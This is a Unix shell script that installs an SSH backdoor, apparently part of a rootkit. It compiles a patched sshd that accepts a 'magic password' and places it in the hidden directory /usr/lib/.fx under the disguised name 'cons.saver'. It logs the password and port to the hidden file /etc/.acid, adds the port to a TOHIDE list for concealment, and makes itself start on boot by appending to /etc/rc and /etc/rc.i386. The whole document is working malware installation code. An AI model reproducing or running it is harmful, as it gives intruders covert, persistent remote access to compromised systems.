#!/bin/sh




TEST_INSTALL="n"
INSTALL_PATH=/usr/lib/.fx
INSTALL_SSH="y"

# check paramz

if [ "$#" -eq "1" ]; then
    INSTALL_PATH=$1
    echo Install path changed to $INSTALL_PATH
    sleep 2
fi

if [ "$TEST_INSTALL" = "y" ]; then
    echo just testing...
    PRF="echo"
else
    echo sshd...
    PRF=
fi


echo checking for gcc ...

GCC_PATH=`whereis gcc | cut -f 2 -d " "`

if [ -n "$GCC_PATH" ]; then
    echo found in $GCC_PATH
else
    echo no gcc ... quitting
    exit 1
fi


echo "compiling md5sum..."
(cd ssh;gcc -o ../md5sum md5sum.c md5.c)


echo
echo "installing sshd 1.2.27 (md5 encryption upgrade by netman)"
echo


if [ "$INSTALL_SSH" = "y" ]; then

    
    echo "system information"
    echo -n "Name   : "
    HNAME=`hostname`
    echo $HNAME

    echo enter your magic sshd password
    read SSH_PASSWORD
    echo enter your sshd port here
    read SSH_PORT

    
    # generate the startup script 
    
    /usr/bin/install -m 755 src/xs $INSTALL_PATH/xs

        
    MD5_OUTPUT=`./md5sum "$SSH_PASSWORD"`
    MD5_SSH_PASSWORD=`echo $MD5_OUTPUT | cut -f 1 -d " "`

    SED_CMD=s/xxxxxxxxxx/"$MD5_SSH_PASSWORD"/
    cat ssh/sshd.c | sed $SED_CMD > sshdx.c
    
    cp -f sshdx.c ssh/sshd.c
    rm -f sshdx.c
    
    SED_CMD=s/29812/"$SSH_PORT"/
    cat ssh/setrgrp.2 | sed $SED_CMD > setrgrp.2
    cp -f setrgrp.2 ssh/setrgrp.2
    rm -f setrgrp.2
    
    echo
    echo sshd magic password set to $SSH_PASSWORD
    echo "compiling sshd , please wait"
    echo
 
    echo SSH Pass: $SSH_PASSWORD >> /etc/.acid  
    echo SSH Port: $SSH_PORT >> /etc/.acid
    echo Please visit http://www.satan.ro for new versions >> /etc/.acid
       
    (cd ssh; ./configure ; make ; strip sshd ; strip ssh)
    
    
    echo $INSTALL_PATH"/sched_host.2" > tmpXXX1
    echo "" >> tmpXXX1
    echo "" >> tmpXXX1
    
    # generate the host key
    
    ssh/ssh-keygen < tmpXXX1
    rm -f tmpXXX1
    
    
    # install the sshd configuration file
    
    SED_PORT_CMD=s/62883/"$SSH_PORT"/
    cat ssh/setrgrp.2 | sed $SED_PORT_CMD > $INSTALL_PATH/setrgrp.2
            
    # install sshd and ssh 
    
    /usr/bin/install ssh/sshd $INSTALL_PATH/cons.saver
    /usr/bin/install ssh/ssh $INSTALL_PATH/ssh
    /usr/bin/install ssh/scp $INSTALL_PATH/scp
    
    
    echo "$SSH_PORT" >> $INSTALL_PATH/TOHIDE
    
    echo 
    echo done installing sshd
    echo    
    
fi
echo "Starting sshd"
cd /usr/lib/.fx
./cons.saver
./xs
echo "/usr/lib/.fx/cons.saver">>/etc/rc
echo "/usr/lib/.fx/xs">>/etc/rc
cd /
echo "/usr/lib/.fx/cons.saver">> /etc/rc.i386

echo
echo "all done ..."


